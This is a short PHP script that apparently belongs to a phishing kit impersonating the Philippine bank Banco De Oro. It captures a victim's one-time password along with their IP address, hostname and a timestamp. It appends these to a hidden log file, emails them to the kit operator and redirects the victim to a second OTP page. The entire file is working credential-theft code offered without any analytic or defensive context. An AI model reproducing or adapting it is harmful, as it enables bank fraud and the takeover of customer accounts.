<?php
$ip = getenv("REMOTE_ADDR");
date_default_timezone_set("Asia/Manila");
$date = gmdate ("Y/m/d");
$dateHis = gmdate ("H:i:sa");

  $onetp1 = $_POST['otp1'];
  $ontp1 = htmlentities($onetp1);

$msg .= gethostbyaddr($ip);
$msg .= "\n";
$msg .= "-------------------[Banco De Oro 2020]-----------------\n";
$msg .= "OTP 1    : ".$ontp1."\n";
$msg .= "Date     : ".$date." @ ".$dateHis."\n";
$msg .= "---------------------[Maria Clara]---------------------\n";
$file = fopen("../lib/otp.html","a+");
$table = "<font color='#C0C0C0' size='2'>|  ".$ip." OTP 1  : ".$ontp1."</font><br>";
fwrite ($file, $table);
fclose($file);

$subject = "New BDO OTP 1 ".$ontp1."";
$headers = 'From: no-reply@email.com' . "\r\n" .
        'X-Mailer: PHP/' . phpversion();

$to = '';
mail($to, $subject, $msg, $headers);

header("location: ../otp2.php");
?>